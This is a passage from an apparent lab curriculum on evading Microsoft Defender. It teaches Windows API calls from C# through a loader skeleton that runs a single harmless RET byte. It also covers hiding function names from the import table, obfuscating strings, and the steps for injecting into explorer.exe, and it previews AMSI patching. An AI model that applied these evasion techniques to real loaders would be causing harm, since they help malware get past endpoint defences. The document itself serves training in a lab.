# Document 03: Windows API - How Programs Talk to Windows

## Where We Are

You finished Document 02 and can write C# programs that store data in variables, make decisions with if/else, loop through arrays, create byte arrays, write functions, XOR-encrypt data, read files, parse command-line arguments, use Marshal.Copy, and build strings from integer offsets.

Your lab is running with Windows 11 (Defender on, default settings), Kali Linux, and both machines on 192.168.10.0/24.

You know how to write C# code. But so far, all your programs do is print text, read files, and do math on bytes. They do not interact with Windows itself. They cannot create windows, open other programs, allocate memory, or do anything that requires the operating system's help. This document teaches you how programs ask Windows to do things, and why that matters for evasion.

## Why This Is Next

Every loader in this curriculum needs Windows to do things that C# cannot do on its own. C# can store data in arrays, but it cannot mark a section of memory as executable. C# can read files, but it cannot inject code into another running program. C# can create objects, but it cannot tell the CPU to start running raw bytes from a specific memory address.

Only Windows can do these things. So the loaders need a way to ask Windows to do them. That is what the Windows API is, and learning how to use it from C# is the bridge between "I can write programs" and "I can write programs that execute shellcode in memory."

## How This Works

### What Is an API (In the Context of Windows)

You already know web APIs. When you send an HTTP request to a server, the server does something and sends back a response. You are asking the server to perform an action. You do not know or care how the server does it internally. You just call the right URL with the right data and the server handles the rest.

The Windows API is the same idea but inside your own computer. Instead of sending HTTP requests to a remote server, your program calls functions that Windows provides. Instead of URLs, you use function names. Instead of JSON payloads, you pass parameters. Instead of HTTP responses, you get return values.

Here is a comparison so this clicks:

**Web API:** You send a POST request to `https://api.example.com/send-email` with a JSON body containing the recipient and message. The server sends the email and returns a success code. You do not build the email protocol yourself. The server handles it.

**Windows API:** Your program calls a function called `MessageBox` with parameters for the title and message text. Windows draws the dialog box on screen with the OK button and everything. You do not draw pixels yourself. Windows handles it.

Every program you have ever used on Windows uses the Windows API. When you open Notepad and it shows a window with a menu bar and a text area, Notepad is calling Windows API functions to create that window, draw the menu, handle keyboard input, and save files. When Chrome shows a dialog asking if you want to save a downloaded file, Chrome is calling a Windows API function that creates that dialog box. When Task Manager shows you a list of running processes, it is calling Windows API functions to get that list.

The Windows API is how programs get things done on Windows. Without it, a program can only do math and text processing. With it, a program can do anything the operating system allows.

### What Is a DLL

You know what a function is from Document 02. You write a function, give it a name, and call it whenever you need it. Windows has thousands of built-in functions. These functions are not floating around randomly. They are organized into files called DLLs.

DLL stands for Dynamic Link Library. A DLL is a file on your hard drive (in C:\Windows\System32\ usually) that contains a collection of functions. When a program needs a function from a DLL, Windows loads that DLL into the program's memory so the program can call the functions inside it.

You can see DLLs right now on your Windows VM. Open File Explorer and go to `C:\Windows\System32\`. You will see hundreds of .dll files. Each one contains functions that programs can use.

The three DLLs that matter for this curriculum:

**kernel32.dll** is the core Windows DLL. It contains functions for memory management (allocating and freeing memory), process management (opening and creating processes), file operations (reading and writing files), and thread management (creating threads to run code). Almost every program on Windows loads kernel32.dll because almost every program needs these basic operations.

**ntdll.dll** is the lowest-level DLL before the Windows kernel itself. Every function in kernel32.dll eventually calls a function in ntdll.dll. For example, when you call VirtualAlloc from kernel32.dll, kernel32 internally calls NtAllocateVirtualMemory from ntdll.dll. Why does this matter? Because Defender places monitoring hooks inside kernel32.dll functions. If you skip kernel32.dll and call ntdll.dll directly, you bypass those hooks. Document 07 (Direct Syscalls) teaches this in detail.

**amsi.dll** contains the Antimalware Scan Interface functions. When PowerShell or another scripting tool wants to check if a script is malware, it calls functions in amsi.dll, which asks Defender for a verdict. Document 08 teaches you to patch these functions so they stop working.

### How Your C# Program Calls a Windows Function

In Document 02, when you wanted to print text, you called `Console.WriteLine()`. That is a C# function built into the .NET framework. You did not need to do anything special to use it because it is part of C#.

Windows API functions are NOT part of C#. They are written in C/C++ and live inside DLL files. C# needs a translation layer to call them. That translation layer is called P/Invoke, which stands for Platform Invoke.

P/Invoke works in three steps:

1. You tell C# which DLL the function is in
2. You describe the function's name, what it accepts, and what it returns
3. You call it like a normal C# function

C# handles all the behind-the-scenes work of finding the DLL, locating the function inside it, converting your C# data types to the types the Windows function expects, calling the function, and converting the result back to C#.

### What Happens When You See a Dialog Box

Before writing any code, here is a concrete example of the Windows API in action.

When you install a program on Windows and it asks "Do you want to allow this app to make changes to your device?" with Yes and No buttons, that is a Windows API function called `MessageBox` being called. The program says "show a dialog with this text and these buttons" and Windows draws the entire thing. The program does not draw pixels, position buttons, or handle mouse clicks on those buttons. Windows does all of that.

When you right-click on your desktop and see a context menu appear, that menu is created by Windows API functions. When you drag a window to resize it, Windows API functions handle the redrawing. When a program shows a "Save As" dialog with the folder browser, that entire dialog is a single Windows API function call.

Every visible element on your Windows desktop exists because some program called a Windows API function to create it.

For evasion, we do not care about dialog boxes and menus. We care about the API functions that work with memory and processes, because those are what let us execute shellcode. But the principle is the same: your program asks Windows to do something by calling a function, and Windows does it.

## What Defender Does

Defender monitors the Windows API at multiple levels:

**Import table scanning.** When you compile a C# program that uses P/Invoke to call Windows functions, the compiled file contains a list of every DLL and function your program imports. This list is called the import table. Defender reads this table. If it sees a program importing VirtualAlloc, CreateThread, and WriteProcessMemory together, those three functions in combination are a strong indicator of code injection. Defender flags the file before it even runs.

**API hooking.** When your program runs and calls a function like VirtualAlloc from kernel32.dll, Defender has modified the beginning of VirtualAlloc inside kernel32.dll. The modification redirects the call to Defender's monitoring code first. Defender checks what you are doing (how much memory, what permissions, which process), decides if it is suspicious, logs it, and then lets the real VirtualAlloc run. This is why Document 07 teaches you to bypass kernel32.dll and call ntdll.dll directly, because Defender's hooks are in kernel32.dll, not in ntdll.dll (in most configurations).

**Behavioral analysis.** Even if individual API calls pass Defender's checks, the pattern of calls matters. A program that allocates memory, makes it executable, copies data into it, and creates a thread to run that data matches the behavioral pattern of a shellcode loader. Defender's machine learning models watch for this sequence.

## The Evasion Technique

This document teaches the normal way to call Windows functions. Understanding the normal way is necessary before you can understand how to do it the evasive way. The evasive techniques you will learn in later documents:

- Document 06: Hide the data (shellcode) using XOR so Defender's static scanner does not recognize it
- Document 07: Skip kernel32.dll and call ntdll.dll directly so Defender's hooks do not see the calls
- Document 08: Patch amsi.dll so Defender cannot scan scripts
- Document 10: Combine all techniques together

But all of these build on the base pattern you learn here: calling Windows functions from C# using P/Invoke.

## Getting the Loader Onto the Target

No loader is built in this document. The programs here are learning exercises that run on your Windows VM directly.

## Teaching the Code

### Part 1: MessageBox - Your First Windows API Call

We start with something you can see. MessageBox creates a dialog box on screen. It is not useful for evasion, but it is the simplest Windows API function to call and it gives you visible proof that your code is talking to Windows.

```csharp
using System;
using System.Runtime.InteropServices;
```

The first line you already know. The second line, `System.Runtime.InteropServices`, contains the P/Invoke tools. You need this in every program that calls Windows functions. It contains the `DllImport` attribute and the `Marshal` class you used in Document 02.

```csharp
class Program
{
    [DllImport("user32.dll", CharSet = CharSet.Unicode)]
    static extern int MessageBox(IntPtr hWnd, string text, string caption, uint type);
```

This is the P/Invoke declaration. Let's break it down piece by piece.

`[DllImport("user32.dll", CharSet = CharSet.Unicode)]` is an attribute (a piece of metadata attached to the function). It tells C# that the function you are about to describe lives inside user32.dll. `CharSet = CharSet.Unicode` tells C# to convert text strings to Unicode format before passing them to Windows (Windows uses Unicode internally).

`static extern` means this function exists outside of C#. You are not writing the code for this function. You are telling C# "there is a function with this name in that DLL, here is what it looks like, go find it and let me call it."

`int MessageBox(IntPtr hWnd, string text, string caption, uint type)` describes the function. It is called MessageBox. It returns an int (which tells you which button the user clicked). It takes four parameters:

- `IntPtr hWnd` is a handle to the parent window. Pass `IntPtr.Zero` for no parent (the dialog appears on its own).
- `string text` is the message displayed inside the dialog.
- `string caption` is the title in the dialog's title bar.
- `uint type` controls which buttons appear. `0` means just an OK button. `1` means OK and Cancel. `4` means Yes and No.

Now call it:

```csharp
    static void Main(string[] args)
    {
        Console.WriteLine("[*] Showing a message box...");

        int result = MessageBox(
            IntPtr.Zero,
            "This dialog was created by calling the Windows API from C#.",
            "Windows API Test",
            1);

        if (result == 1)
            Console.WriteLine("[+] User clicked OK.");
        else if (result == 2)
            Console.WriteLine("[+] User clicked Cancel.");
    }
}
```

Here is the complete program:

```csharp
using System;
using System.Runtime.InteropServices;

class Program
{
    [DllImport("user32.dll", CharSet = CharSet.Unicode)]
    static extern int MessageBox(IntPtr hWnd, string text, string caption, uint type);

    static void Main(string[] args)
    {
        Console.WriteLine("[*] Showing a message box...");

        int result = MessageBox(
            IntPtr.Zero,
            "This dialog was created by calling the Windows API from C#.",
            "Windows API Test",
            1);

        if (result == 1)
            Console.WriteLine("[+] User clicked OK.");
        else if (result == 2)
            Console.WriteLine("[+] User clicked Cancel.");
    }
}
```

Run it with `dotnet run`. A dialog box pops up on your Windows VM with your message, a title bar that says "Windows API Test", and OK and Cancel buttons. Click one. The program prints which button you clicked.

That dialog box with its buttons, its title bar, its icon, and its ability to receive your mouse click was created by Windows, not by your code. Your code only said "make a dialog with this text and these buttons." Windows did everything else. That is the Windows API in action.

### Part 2: GetCurrentProcessId - Getting Information from Windows

MessageBox makes Windows do something visible. But most Windows API functions work behind the scenes. GetCurrentProcessId returns the process ID of your running program. A process ID (PID) is a unique number Windows gives to every running program so it can tell them apart.

Open Task Manager on your Windows VM (Ctrl+Shift+Esc). You see a list of running programs. Each one has a PID column (if you do not see it, right-click the column headers and enable PID). Every number there came from Windows assigning a PID when the program started.

```csharp
    [DllImport("kernel32.dll")]
    static extern uint GetCurrentProcessId();
```

This function lives in kernel32.dll (not user32.dll like MessageBox). It takes no parameters and returns a `uint` (unsigned 32-bit integer), which is the PID.

```csharp
    static void Main(string[] args)
    {
        uint pid = GetCurrentProcessId();
        Console.WriteLine("[+] This program's process ID: " + pid);
        Console.WriteLine("[*] Open Task Manager and find this PID to confirm.");
        Console.ReadLine();
    }
}
```

`Console.ReadLine()` pauses the program and waits for you to press Enter. This gives you time to open Task Manager and find the PID before the program exits.

Here is the complete program:

```csharp
using System;
using System.Runtime.InteropServices;

class Program
{
    [DllImport("kernel32.dll")]
    static extern uint GetCurrentProcessId();

    static void Main(string[] args)
    {
        uint pid = GetCurrentProcessId();
        Console.WriteLine("[+] This program's process ID: " + pid);
        Console.WriteLine("[*] Open Task Manager and find this PID to confirm.");
        Console.WriteLine("[*] Press Enter to exit.");
        Console.ReadLine();
    }
}
```

Run it. It prints a PID number. Open Task Manager, look for your program (it will be "dotnet" or your project name), and confirm the PID matches. You just asked Windows a question and got an answer using the Windows API.

### Part 3: Understanding Handles

Before going further, you need to understand handles because almost every Windows API function uses them.

When you open a file on your computer, Windows does not give your program the actual file. Windows gives your program a handle, which is a number that represents the file. When your program wants to read from the file, it passes the handle back to Windows and says "read from this." When it is done, it passes the handle back and says "close this." The handle is like a reference number that both your program and Windows understand.

Handles are used for everything in Windows, not just files. Processes have handles. Threads have handles. Memory regions have handles. Windows objects have handles. When you call a function like OpenProcess (which lets you interact with another running process), Windows gives you a handle to that process. You then pass that handle to other functions that need to work with that process.

In C#, handles are stored as `IntPtr` values. When a function returns `IntPtr.Zero`, it means the function failed and did not give you a valid handle. You always check for this.

```csharp
        IntPtr handle = SomeWindowsFunction();
        if (handle == IntPtr.Zero)
        {
            Console.WriteLine("[-] Failed to get handle.");
            return;
        }
```

When you are done with a handle, you close it using CloseHandle:

```csharp
    [DllImport("kernel32.dll")]
    static extern bool CloseHandle(IntPtr hObject);
```

```csharp
        CloseHandle(handle);
```

If you do not close handles, they stay open and waste system resources. In a short loader that runs shellcode and then exits, Windows cleans up all handles when the process ends. But it is good practice to close them.

### Part 4: VirtualAlloc - Asking Windows for Memory

This is the first function that directly matters for shellcode execution. VirtualAlloc asks Windows to set aside a block of memory for your program to use.

Why can't you just use a C# byte array? Because C# byte arrays live in managed memory, and managed memory is controlled by C#'s garbage collector. The garbage collector can move your array around in memory whenever it wants (to clean up unused memory), and it marks memory as non-executable. You cannot tell the CPU to run code from a C# byte array because C# does not allow it.

VirtualAlloc gives you unmanaged memory that C# does not control. You choose the size and the permissions. The critical permission is "execute," which tells the CPU that the bytes in this memory are instructions it should run, not just data.

```csharp
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAlloc(
        IntPtr lpAddress,
        uint dwSize,
        uint flAllocationType,
        uint flProtect);
```

`SetLastError = true` tells C# to remember the error code if VirtualAlloc fails, so you can find out what went wrong.

The four parameters:

`IntPtr lpAddress` - where in memory you want the block. Pass `IntPtr.Zero` and Windows picks a spot for you. You almost always let Windows choose.

`uint dwSize` - how many bytes you want. For shellcode, this matches the size of your shellcode payload (usually 400 to 600 bytes, but you request the exact size your data needs).

`uint flAllocationType` - what kind of allocation. The value `0x3000` means "reserve the address space AND make the memory ready to use." This is a combination of two flags: MEM_COMMIT (0x1000) which prepares the memory pages, and MEM_RESERVE (0x2000) which reserves the address range. You combine them with a bitwise OR, and 0x1000 | 0x2000 = 0x3000. You use 0x3000 for every allocation in this curriculum.

`uint flProtect` - the permissions for this memory. This is the important one:
- `0x04` means PAGE_READWRITE: you can read from it and write to it, but you cannot execute code from it
- `0x20` means PAGE_EXECUTE_READ: you can read from it and the CPU can execute code from it, but you cannot write to it
- `0x40` means PAGE_EXECUTE_READWRITE: you can read, write, and execute (all permissions at once)

Using `0x40` is the simplest approach because you can write your shellcode and execute it without changing permissions. But `0x40` is suspicious because legitimate programs rarely need memory that is both writable and executable at the same time. Defender watches for this. The safer approach is to allocate with `0x04` (read-write), copy your shellcode in, then change the permissions to `0x20` (execute-read) using VirtualProtect. This two-step approach looks more normal.

Now let's call it:

```csharp
        uint memorySize = 4096;
        IntPtr memoryAddress = VirtualAlloc(
            IntPtr.Zero,
            memorySize,
            0x3000,
            0x04);
```

This asks Windows: "Give me 4096 bytes of memory that I can read and write to. Pick any address you want."

```csharp
        if (memoryAddress == IntPtr.Zero)
        {
            Console.WriteLine("[-] VirtualAlloc failed. Windows refused to give us memory.");
            return;
        }
        Console.WriteLine("[+] Windows gave us memory at address: 0x" + memoryAddress.ToString("X"));
```

If Windows returns address zero, it means the allocation failed (out of memory, invalid parameters, etc.). Otherwise, you have a valid address where you can store data.

Here is the complete program:

```csharp
using System;
using System.Runtime.InteropServices;

class Program
{
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAlloc(
        IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern bool VirtualFree(
        IntPtr lpAddress, uint dwSize, uint dwFreeType);

    static void Main(string[] args)
    {
        uint size = 4096;
        Console.WriteLine("[*] Asking Windows for " + size + " bytes of memory...");

        IntPtr mem = VirtualAlloc(IntPtr.Zero, size, 0x3000, 0x04);

        if (mem == IntPtr.Zero)
        {
            Console.WriteLine("[-] VirtualAlloc failed.");
            return;
        }

        Console.WriteLine("[+] Got memory at: 0x" + mem.ToString("X"));
        Console.WriteLine("[*] This memory can be read and written to, but not executed.");

        VirtualFree(mem, 0, 0x8000);
        Console.WriteLine("[+] Memory returned to Windows.");
    }
}
```

`VirtualFree` gives the memory back to Windows when you are done. `0x8000` is MEM_RELEASE, which releases the entire block. In a real loader, you do not free the memory because your shellcode needs to keep running in it. But for a learning example, you clean up.

### Part 5: Copying Data Into Allocated Memory

After VirtualAlloc gives you a memory block, you need to put your shellcode bytes into it. You already learned `Marshal.Copy` in Document 02. Here is how it fits with VirtualAlloc:

```csharp
        byte[] data = new byte[] { 0xCC, 0x90, 0x90, 0xC3 };

        IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)data.Length, 0x3000, 0x04);
        if (mem == IntPtr.Zero)
        {
            Console.WriteLine("[-] VirtualAlloc failed.");
            return;
        }
```

First, allocate memory the same size as your data.

```csharp
        Marshal.Copy(data, 0, mem, data.Length);
        Console.WriteLine("[+] Copied " + data.Length + " bytes into allocated memory.");
```

`Marshal.Copy` copies from the C# byte array (`data`) starting at position 0, into the memory at address `mem`, copying `data.Length` bytes. After this call, the memory block contains your bytes.

```csharp
        Array.Clear(data, 0, data.Length);
        Console.WriteLine("[+] Cleared the original array.");
```

After copying, clear the source array. Now the bytes exist only in the VirtualAlloc memory, not in the C# array. If Defender scans your program's managed memory, it will not find the shellcode there because you cleared it.

Here is the complete program:

```csharp
using System;
using System.Runtime.InteropServices;

class Program
{
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAlloc(
        IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern bool VirtualFree(
        IntPtr lpAddress, uint dwSize, uint dwFreeType);

    static void Main(string[] args)
    {
        byte[] data = new byte[] { 0xCC, 0x90, 0x90, 0xC3 };
        Console.WriteLine("[*] Data: " + data.Length + " bytes.");

        IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)data.Length, 0x3000, 0x04);
        if (mem == IntPtr.Zero)
        {
            Console.WriteLine("[-] VirtualAlloc failed.");
            return;
        }
        Console.WriteLine("[+] Memory at: 0x" + mem.ToString("X"));

        Marshal.Copy(data, 0, mem, data.Length);
        Console.WriteLine("[+] Data copied to memory.");

        Array.Clear(data, 0, data.Length);
        Console.WriteLine("[+] Source array cleared.");

        byte check = Marshal.ReadByte(mem);
        Console.WriteLine("[*] First byte in memory: 0x" + check.ToString("X2"));

        VirtualFree(mem, 0, 0x8000);
        Console.WriteLine("[+] Done.");
    }
}
```

`Marshal.ReadByte(mem)` reads one byte from the allocated memory to verify the copy worked. It should print `0xCC`, confirming the data is there.

### Part 6: VirtualProtect - Changing Memory Permissions

Right now your allocated memory has read-write permissions (0x04). The CPU refuses to execute code from read-write memory because of a security feature called Data Execution Prevention (DEP). DEP exists specifically to prevent attackers from putting code into data memory and running it. If DEP did not exist, every buffer overflow would be trivially exploitable.

To make the CPU execute your shellcode, you need to change the memory permissions to include "execute." VirtualProtect changes the permissions of an existing memory block.

```csharp
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool VirtualProtect(
        IntPtr lpAddress,
        uint dwSize,
        uint flNewProtect,
        out uint lpflOldProtect);
```

Four parameters:

`IntPtr lpAddress` - the address of the memory block (from VirtualAlloc).

`uint dwSize` - how many bytes to change permissions for.

`uint flNewProtect` - the new permission value. Use `0x20` (PAGE_EXECUTE_READ) to make it executable and readable but not writable. This is what you want after you have finished copying data in.

`out uint lpflOldProtect` - Windows writes the old permissions into this variable. The `out` keyword means VirtualProtect fills this in for you. You need to provide the variable but you usually do not use the value.

```csharp
        uint oldPermissions;
        bool success = VirtualProtect(mem, (uint)data.Length, 0x20, out oldPermissions);

        if (!success)
        {
            Console.WriteLine("[-] VirtualProtect failed. Cannot make memory executable.");
            return;
        }
        Console.WriteLine("[+] Memory permissions changed to execute-read.");
```

After this call, the memory at address `mem` can be executed by the CPU. You can no longer write to it (because we used 0x20, not 0x40), but that is fine because the data is already there.

The complete two-step pattern is:

1. VirtualAlloc with 0x04 (read-write) to get writable memory
2. Marshal.Copy to put your data into that memory
3. VirtualProtect with 0x20 (execute-read) to make it executable

This is less suspicious than allocating directly with 0x40 (read-write-execute) because the memory is never writable and executable at the same time. When you are writing to it, it is not executable. When it becomes executable, it is no longer writable.

### Part 7: CreateThread - Telling the CPU to Run Your Code

Your data is in memory and the memory is executable. The last step is telling the CPU to start executing the bytes at that address. You do this by creating a new thread.

A thread is a separate path of execution inside your program. Your Main function runs on the main thread. When you create a new thread, your program has two things running simultaneously: the main thread (which continues in Main) and the new thread (which starts at whatever address you specify).

```csharp
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr CreateThread(
        IntPtr lpThreadAttributes,
        uint dwStackSize,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        uint dwCreationFlags,
        out uint lpThreadId);
```

This has six parameters, but most of them are default values. The important one is `lpStartAddress`, which is the memory address where the thread starts executing.

```csharp
        IntPtr thread = CreateThread(
            IntPtr.Zero,
            0,
            mem,
            IntPtr.Zero,
            0,
            out uint threadId);
```

`IntPtr.Zero` for thread attributes means default security settings. `0` for stack size means default stack. `mem` is the address of your shellcode. `IntPtr.Zero` for parameter means no extra data. `0` for creation flags means the thread starts running immediately. `threadId` receives the new thread's ID.

After this call, the CPU is executing the bytes at address `mem`. But there is a problem: if your Main function reaches the end and the program exits, the new thread dies with it. The shellcode might still be running (for example, a reverse shell connection), and you do not want the program to exit while that is happening.

WaitForSingleObject tells the main thread to pause and wait for the new thread to finish:

```csharp
    [DllImport("kernel32.dll")]
    static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
```

```csharp
        WaitForSingleObject(thread, 0xFFFFFFFF);
```

`0xFFFFFFFF` means wait forever. The main thread stops here and does not continue until the new thread exits. For a reverse shell payload, the new thread runs until the connection drops. For our test byte `0xC3` (the RET instruction), the thread returns immediately.

Here is the complete program that puts everything together. It allocates memory, copies a single RET instruction into it, makes it executable, creates a thread to run it, and waits for the thread to finish:

```csharp
using System;
using System.Runtime.InteropServices;

class Program
{
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAlloc(
        IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool VirtualProtect(
        IntPtr lpAddress, uint dwSize,
        uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr CreateThread(
        IntPtr lpThreadAttributes, uint dwStackSize,
        IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll")]
    static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    static void Main(string[] args)
    {
        byte[] code = new byte[] { 0xC3 };
        Console.WriteLine("[*] Payload: 1 byte (RET instruction - returns immediately).");

        IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)code.Length, 0x3000, 0x04);
        if (mem == IntPtr.Zero)
        {
            Console.WriteLine("[-] VirtualAlloc failed.");
            return;
        }
        Console.WriteLine("[+] Memory allocated at: 0x" + mem.ToString("X"));

        Marshal.Copy(code, 0, mem, code.Length);
        Console.WriteLine("[+] Payload copied to memory.");

        uint oldProtect;
        if (!VirtualProtect(mem, (uint)code.Length, 0x20, out oldProtect))
        {
            Console.WriteLine("[-] VirtualProtect failed.");
            return;
        }
        Console.WriteLine("[+] Memory is now executable.");

        IntPtr thread = CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, out uint tid);
        if (thread == IntPtr.Zero)
        {
            Console.WriteLine("[-] CreateThread failed.");
            return;
        }
        Console.WriteLine("[+] Thread " + tid + " started execution.");

        WaitForSingleObject(thread, 0xFFFFFFFF);
        Console.WriteLine("[+] Thread finished. Program exiting.");
    }
}
```

The byte `0xC3` is the x86 machine instruction for RET (return from function). When the CPU starts executing at the memory address, it hits 0xC3 and immediately returns, ending the thread. This is safe to run. The output will be:

```
[*] Payload: 1 byte (RET instruction - returns immediately).
[+] Memory allocated at: 0x<address>
[+] Payload copied to memory.
[+] Memory is now executable.
[+] Thread <id> started execution.
[+] Thread finished. Program exiting.
```

In Document 05, you replace `{ 0xC3 }` with real msfvenom shellcode. Instead of returning immediately, the thread opens a reverse shell connection to your Kali machine. The only thing that changes is the bytes. The pattern (allocate, copy, protect, thread, wait) stays exactly the same.

### Part 8: Dynamic API Resolution - Finding Functions at Runtime

Every DllImport declaration you write goes into the compiled binary's import table. Defender reads this table. If your binary imports VirtualAlloc, VirtualProtect, CreateThread, and WriteProcessMemory, Defender does not even need to run your program to know it is suspicious. The import table alone is enough evidence.

Dynamic API resolution avoids this. Instead of declaring the function with DllImport (which puts it in the import table), you find the function's address at runtime using two helper functions: GetModuleHandle and GetProcAddress.

```csharp
    [DllImport("kernel32.dll")]
    static extern IntPtr GetModuleHandle(string lpModuleName);
```

GetModuleHandle takes a DLL name and returns the address where that DLL is loaded in your program's memory. Every Windows process automatically loads kernel32.dll, so GetModuleHandle("kernel32.dll") always works.

```csharp
    [DllImport("kernel32.dll")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
```

GetProcAddress takes a DLL address (from GetModuleHandle) and a function name, and returns the address of that function in memory.

Using them together:

```csharp
        IntPtr k32 = GetModuleHandle("kernel32.dll");
        Console.WriteLine("[+] kernel32.dll is at: 0x" + k32.ToString("X"));

        IntPtr funcAddr = GetProcAddress(k32, "VirtualAlloc");
        Console.WriteLine("[+] VirtualAlloc is at: 0x" + funcAddr.ToString("X"));
```

Now you have the raw memory address of VirtualAlloc. But you cannot just call an address in C#. You need to tell C# what parameters the function takes so it knows how to call it. You do this with a delegate.

A delegate is a type that describes a function's shape (what it accepts and returns). It is like a blueprint:

```csharp
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate IntPtr VirtualAllocDelegate(
        IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);
```

This says "a VirtualAllocDelegate is any function that takes these four parameters and returns an IntPtr." `[UnmanagedFunctionPointer(CallingConvention.StdCall)]` tells C# this is a Windows-style function (Windows uses a specific way of passing parameters called StdCall).

Now convert the address to a callable function:

```csharp
        var allocFunc = (VirtualAllocDelegate)Marshal.GetDelegateForFunctionPointer(
            funcAddr, typeof(VirtualAllocDelegate));
```

`Marshal.GetDelegateForFunctionPointer` takes an address and a delegate type, and gives you something you can call like a function. Now you call VirtualAlloc through `allocFunc`:

```csharp
        IntPtr mem = allocFunc(IntPtr.Zero, 4096, 0x3000, 0x04);
```

This does exactly the same thing as calling VirtualAlloc through DllImport. The difference is that "VirtualAlloc" does not appear in the import table of the compiled binary because you did not use DllImport for it. You found it at runtime using GetProcAddress.

In the real loaders, even the string "VirtualAlloc" is hidden using FromOffsets (from Document 02):

```csharp
        string name = FromOffsets(32, 54,73,82,84,85,65,76,33,76,76,79,67);
        IntPtr funcAddr = GetProcAddress(k32, name);
```

The compiled binary contains numbers (32, 54, 73, 82...) instead of the text "VirtualAlloc". Defender's static scanner sees numbers, not function names. The string is constructed only at runtime, in memory, where the static scanner cannot see it.

Here is the complete program:

```csharp
using System;
using System.Runtime.InteropServices;

class Program
{
    [DllImport("kernel32.dll")]
    static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32.dll")]
    static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate IntPtr VirtualAllocDelegate(
        IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    static void Main(string[] args)
    {
        IntPtr k32 = GetModuleHandle("kernel32.dll");
        if (k32 == IntPtr.Zero)
        {
            Console.WriteLine("[-] Could not find kernel32.dll.");
            return;
        }
        Console.WriteLine("[+] kernel32.dll at: 0x" + k32.ToString("X"));

        IntPtr vaAddr = GetProcAddress(k32, "VirtualAlloc");
        if (vaAddr == IntPtr.Zero)
        {
            Console.WriteLine("[-] Could not find VirtualAlloc.");
            return;
        }
        Console.WriteLine("[+] VirtualAlloc at: 0x" + vaAddr.ToString("X"));

        var allocFunc = (VirtualAllocDelegate)Marshal.GetDelegateForFunctionPointer(
            vaAddr, typeof(VirtualAllocDelegate));
        Console.WriteLine("[+] Created callable function from address.");

        IntPtr mem = allocFunc(IntPtr.Zero, 4096, 0x3000, 0x04);
        if (mem == IntPtr.Zero)
        {
            Console.WriteLine("[-] VirtualAlloc (dynamic) failed.");
            return;
        }
        Console.WriteLine("[+] Allocated memory at: 0x" + mem.ToString("X"));
        Console.WriteLine("[*] VirtualAlloc was called WITHOUT being in the import table.");

        VirtualFree(mem, 0, 0x8000);
        Console.WriteLine("[+] Memory freed.");
    }
}
```

### Part 9: OpenProcess - Interacting with Other Running Programs

Documents 09 and 10 inject code into other running programs instead of running it in the loader's own process. This makes detection harder because the shellcode runs inside a trusted process like explorer.exe.

To work with another process, you first need to get a handle to it. OpenProcess gives you this handle:

```csharp
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
```

`dwDesiredAccess` specifies what you want to do with the process. Different values give different permissions:
- `0x0400` is PROCESS_QUERY_INFORMATION, which lets you read information about the process (safe, used for inspection)
- `0x001FFFFF` is PROCESS_ALL_ACCESS, which gives you full control (needed for injection)

`bInheritHandle` is almost always `false`. `dwProcessId` is the PID of the process you want to open.

To find a process by name, C# has a built-in class:

```csharp
using System.Diagnostics;
```

```csharp
        Process[] found = Process.GetProcessesByName("explorer");
        if (found.Length == 0)
        {
            Console.WriteLine("[-] explorer.exe is not running.");
            return;
        }

        int targetPid = found[0].Id;
        Console.WriteLine("[+] Found explorer.exe with PID: " + targetPid);
```

`Process.GetProcessesByName("explorer")` searches for all processes named "explorer" (you leave off the .exe). It returns an array because there could be multiple instances. `found[0].Id` gets the PID of the first one.

Now open it:

```csharp
        IntPtr processHandle = OpenProcess(0x0400, false, targetPid);
        if (processHandle == IntPtr.Zero)
        {
            Console.WriteLine("[-] OpenProcess failed. Not enough permissions.");
            return;
        }
        Console.WriteLine("[+] Got handle to explorer.exe.");
```

If OpenProcess fails (returns IntPtr.Zero), it usually means you do not have sufficient permissions. To inject into another process, you typically need to run as Administrator.

For injection (Documents 09 and 10), after OpenProcess you use three more functions that work on the remote process:

- **VirtualAllocEx** allocates memory inside the target process (not your own)
- **WriteProcessMemory** copies bytes from your process into the target process
- **CreateRemoteThread** creates a thread in the target process at the address where you wrote your bytes

We will not use these functions for real in this document because they require real shellcode and a properly set up attack scenario. The point is to understand the pattern:

1. Find the target process (by name or PID)
2. OpenProcess to get a handle
3. VirtualAllocEx to allocate memory inside it
4. WriteProcessMemory to copy shellcode into that memory
5. CreateRemoteThread to start executing the shellcode

Here is a safe program that demonstrates finding a process and opening it with read-only permissions:

```csharp
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

class Program
{
